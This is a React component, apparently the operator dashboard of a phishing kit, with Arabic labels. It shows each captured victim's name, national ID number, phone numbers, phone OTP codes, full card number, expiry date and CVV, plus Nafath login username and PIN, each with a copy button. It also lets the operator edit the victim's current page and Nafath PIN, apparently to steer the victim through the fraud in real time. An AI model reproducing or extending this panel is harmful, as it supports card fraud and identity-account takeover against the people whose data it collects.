"use client"

import { useState } from "react"
import { MessageSquare, Copy, Edit2, Save, X } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Badge } from "@/components/ui/badge"
import { ScrollArea } from "@/components/ui/scroll-area"
import { useToast } from "@/hooks/use-toast"

interface NotificationDetailsProps {
  notification: any | null
  onUpdate?: (id: string, field: string, value: string) => void
}

export function NotificationDetails({ notification, onUpdate }: NotificationDetailsProps) {
  const [editingField, setEditingField] = useState<string | null>(null)
  const [editValue, setEditValue] = useState("")
  const { toast } = useToast()

  if (!notification) {
    return (
      <div className="flex-1 flex items-center justify-center bg-slate-50 dark:bg-slate-900">
        <div className="text-center space-y-4 max-w-md">
          <div className="bg-slate-100 dark:bg-slate-800 rounded-full p-8 mx-auto w-fit">
            <MessageSquare className="h-16 w-16 text-slate-400" />
          </div>
          <div>
            <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-2">اختر إشعاراً لعرض التفاصيل</h3>
            <p className="text-slate-500 dark:text-slate-400">انقر على أي إشعار من القائمة لعرض معلوماته التفصيلية</p>
          </div>
        </div>
      </div>
    )
  }

  const handleEdit = (field: string, currentValue: string) => {
    setEditingField(field)
    setEditValue(currentValue || "")
  }

  const handleSave = () => {
    if (editingField && onUpdate) {
      onUpdate(notification.id, editingField, editValue)
      setEditingField(null)
      toast({
        title: "تم التحديث",
        description: "تم حفظ التغييرات بنجاح",
      })
    }
  }

  const handleCancel = () => {
    setEditingField(null)
    setEditValue("")
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    toast({
      title: "تم النسخ",
      description: "تم نسخ النص إلى الحافظة",
    })
  }

  const DetailField = ({
    label,
    value,
    field,
    copyable = false,
  }: {
    label: string
    value: string
    field?: string
    copyable?: boolean
  }) => (
    <div className="space-y-2">
      <label className="text-sm font-medium text-slate-700 dark:text-slate-300">{label}</label>
      <div className="flex items-center gap-2">
        {editingField === field ? (
          <div className="flex items-center gap-2 flex-1">
            <Input value={editValue} onChange={(e) => setEditValue(e.target.value)} className="flex-1" />
            <Button size="sm" onClick={handleSave}>
              <Save className="h-4 w-4" />
            </Button>
            <Button size="sm" variant="outline" onClick={handleCancel}>
              <X className="h-4 w-4" />
            </Button>
          </div>
        ) : (
          <div className="flex items-center gap-2 flex-1">
            <span className="text-slate-900 dark:text-white bg-slate-50 dark:bg-slate-800 px-3 py-2 rounded-md flex-1">
              {value || "غير محدد"}
            </span>
            {field && onUpdate && (
              <Button size="sm" variant="ghost" onClick={() => handleEdit(field, value)}>
                <Edit2 className="h-4 w-4" />
              </Button>
            )}
            {copyable && value && (
              <Button size="sm" variant="ghost" onClick={() => copyToClipboard(value)}>
                <Copy className="h-4 w-4" />
              </Button>
            )}
          </div>
        )}
      </div>
    </div>
  )

  return (
    <div className="flex-1 bg-white dark:bg-slate-800">
      <ScrollArea className="h-full">
        <div className="p-6 space-y-6">
          {/* Header */}
          <div className="flex items-center gap-4 pb-4 border-b">
            <Avatar className="h-16 w-16">
              <AvatarImage src="/placeholder.svg?height=64&width=64" />
              <AvatarFallback className="bg-blue-100 dark:bg-blue-900 text-blue-700 dark:text-blue-300 text-lg font-bold">
                {(notification.documment_owner_full_name || notification.phone || "مستخدم").slice(0, 2).toUpperCase()}
              </AvatarFallback>
            </Avatar>
            <div className="flex-1">
              <h2 className="text-2xl font-bold text-slate-900 dark:text-white">
                {notification.documment_owner_full_name || notification.phone || "مستخدم جديد"}
              </h2>
              <div className="flex items-center gap-2 mt-1">
                <Badge variant="outline">{notification.country}</Badge>
                {notification.operator && <Badge variant="secondary">{notification.operator}</Badge>}
              </div>
            </div>
          </div>

          {/* Personal Information */}
          <Card>
            <CardHeader>
              <CardTitle className="text-lg">المعلومات الشخصية</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <DetailField
                label="الاسم الكامل"
                value={notification.documment_owner_full_name}
                field="documment_owner_full_name"
                copyable
              />
              <DetailField label="رقم الهوية" value={notification.owner_identity_number} copyable />
              <DetailField label="الدولة" value={notification.country} copyable />
              <DetailField label="المشغل" value={notification.operator} />
              <DetailField label="الصفحة الحالية" value={notification.currentPage} field="currentPage" />
            </CardContent>
          </Card>

          {/* Contact Information */}
          {(notification.phone || notification.phone2 || notification.phoneOtpCode) && (
            <Card>
              <CardHeader>
                <CardTitle className="text-lg">معلومات الاتصال</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {notification.phone && <DetailField label="رقم الهاتف الأول" value={notification.phone} copyable />}
                {notification.phone2 && <DetailField label="رقم الهاتف الثاني" value={notification.phone2} copyable />}
                {notification.phoneOtpCode && (
                  <DetailField label="رمز OTP الهاتف" value={notification.phoneOtpCode} copyable />
                )}
              </CardContent>
            </Card>
          )}

          {/* Card Information */}
          {notification.cardNumber && (
            <Card>
              <CardHeader>
                <CardTitle className="text-lg">معلومات البطاقة</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <DetailField label="رقم البطاقة" value={notification.cardNumber} copyable />
                <DetailField label="تاريخ الانتهاء" value={notification.expiryDate} copyable />
                <DetailField label="CVV" value={notification.cvv} copyable />
              </CardContent>
            </Card>
          )}

          {/* Nafaz Information */}
          {notification.nafadUsername && (
            <Card>
              <CardHeader>
                <CardTitle className="text-lg">معلومات نفاذ</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <DetailField label="اسم المستخدم" value={notification.nafadUsername} copyable />
                <DetailField label="رقم التفويض" value={notification.nafaz_pin} field="nafaz_pin" copyable />
                <DetailField label="حالة التحقق" value={notification.nafazStatus || "معلق"} />
              </CardContent>
            </Card>
          )}
        </div>
      </ScrollArea>
    </div>
  )
}
